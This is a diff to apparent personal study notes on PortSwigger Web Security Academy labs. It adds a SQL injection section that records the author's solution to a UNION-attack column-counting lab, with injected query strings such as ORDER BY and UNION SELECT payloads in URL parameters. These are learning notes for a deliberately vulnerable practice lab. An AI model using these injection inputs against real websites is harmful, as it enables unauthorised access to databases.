@@ -7,6 +7,7 @@
 1. [Access Control](#access-control)
 2. [Cross Origin Resource Sharing](#cross-origin-resource-sharing-cors)
 3. [Cross-site scripting](#cross-site-scripting)
+4. [SQL Injection](#sql-injection)
 
 ## Access Control
 
@@ -585,3 +586,16 @@ h1.innerText = searchResults.length + " search results for '" + searchTerm + "'"
 ```
 
 XSS in [innerText](https://stackoverflow.com/questions/52707031/does-innertext-prevent-xss).
+
+## SQL Injection
+
+#### [Lab](https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns): Lab: SQL injection UNION attack, determining the number of columns returned by the query
+
+1. Initial request: `GET /filter?category=Food+%26+Drink`
+2. Guess: `SELECT name, price FROM products WHERE category='[input]'`
+3. SQL query attempts:
+    - `/filter?category='+ORDER+BY+3--`
+    - `/filter?category='+UNION+SELECT+id,name,price+FROM+products--`
+4. Just had to return an additional row containing null values.
+
+
